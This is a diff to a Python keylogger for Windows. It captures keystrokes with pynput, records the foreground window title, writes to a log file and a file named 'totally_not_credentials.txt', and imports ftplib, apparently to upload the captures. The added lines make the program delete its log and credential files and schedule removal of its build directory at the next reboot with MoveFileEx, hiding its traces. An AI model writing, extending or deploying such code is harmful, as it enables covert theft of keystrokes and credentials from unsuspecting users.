@@ -1,10 +1,15 @@
 from multiprocessing import Queue # needed for compilation
 from pynput.keyboard import Key, Listener
 from win32gui import GetWindowText, GetForegroundWindow
-from os import remove
+from os import getcwd, remove
+from sys import argv
+from shutil import rmtree
 import logging
 import ftplib
 import Analyzer
+import win32file
+import win32api
+#import ctypes
 
 log_file = 'C:\\Users\\Benjamin Pollak\\Desktop\\log.txt'
 cred_file = 'C:\\Users\\Benjamin Pollak\\Desktop\\totally_not_credentials.txt'
@@ -48,6 +53,12 @@ class Logger:
         logging.shutdown()
         remove(log_file)
         remove(cred_file)
+        val = win32file.MoveFileEx((getcwd() + r'\build'), None ,
+                 win32file.MOVEFILE_DELAY_UNTIL_REBOOT)
+        print(val)
+        #ctypes.windll.kernel32.MoveFileExA((getcwd() + r'\build'), None,
+        #                                    win32file.MOVEFILE_DELAY_UNTIL_REBOOT)
+
         
 if __name__ == '__main__':
     logger = Logger(log_file, cred_file)
